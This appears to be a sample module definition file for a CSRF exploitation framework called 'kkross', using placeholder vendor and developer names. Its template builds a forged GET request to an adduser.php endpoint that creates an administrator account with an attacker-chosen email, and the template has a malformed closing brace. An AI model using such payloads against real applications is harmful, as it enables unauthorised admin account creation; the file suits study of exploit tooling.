---
# ** kkross module definition **
# Version of module structure, in order to enable future changes and compatibility determination
structure_version: 0
data:
  type: csrf_get
  metadata:
    # Arbitrary metadata for module (attributes "name" and "description" are required)
    name: foobar_app-add_user 
    description: Exploits lacking CSRF protection for the user add functionality
    vendor: Foobar Enterprises
    cve: ""
    affected_versions: 5.4.2 > 5.9.1
    fixed_in: 5.9.2
    links:
      - http://seclists.org/fulldisclosure/2016/Jun/20

    exploit_version: 1
    developers:
      - Test Testsson <test@example.com>
      - Beta Provberg <beta@example.com>

  # Settings that needs to be configured before module is added to crusade
  # Certain options may be inherited from type - such as "HOST", "PROTO" and "PORT"
  options:
    - name: EMAIL
      description: Desired e-mail address of added user
      type: string
      default: ""
      required: true

      # Specifies different types of limitations for the module option
      constraints:
        - type: length
          options:
            max: 25

  # Template for module redering (based on Jinja2)
  template: '{{ PROTO }}://{{ HOST }}:{{ PORT }/actions/adduser.php?role=admin&email={{ EMAIL | urlencode }}'
